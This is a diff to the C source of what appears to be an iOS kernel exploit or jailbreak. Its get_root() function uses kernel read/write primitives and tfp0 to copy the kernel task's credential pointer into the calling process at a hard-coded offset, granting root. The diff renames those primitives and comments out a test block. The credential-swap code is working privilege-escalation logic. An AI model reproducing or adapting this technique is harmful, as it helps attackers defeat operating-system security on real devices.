@@ -876,16 +876,16 @@ kern_return_t get_root () {
     extern uint64_t kernel_task;
     printf("[INFO]: kernel_task: %llx\n", kernel_task); // BSD_INFO
     
-    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    uint64_t kern_ucred = rk64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
     printf("[INFO]: kern_ucred: %llx\n", kern_ucred);
     
     uint64_t offsetof_p_csflags = 0x2a8;
     
-    uint32_t csflags = kread_uint32(our_proc + offsetof_p_csflags);
+    uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
     
-    uint64_t our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    uint64_t our_cred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
     
-    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
+    wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
     
     
     printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
@@ -904,7 +904,7 @@ mach_port_t go() {
   printf("tfp0: %x\n", tfp0);
     
     
-    uint64_t kernelbase = find_kernel_base();
+    /*uint64_t kernelbase = find_kernel_base();
     
     extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
     uint64_t magic = 0;
@@ -915,7 +915,7 @@ mach_port_t go() {
     FILE *f = fopen("/var/mobile/test.txt", "w");
     if(f == 0){
         printf("failed to write file\n");
-    }
+    }*/
     
     //char* env_path = prepare_payload();
     //printf("will launch a shell with this environment: %s\n", env_path);
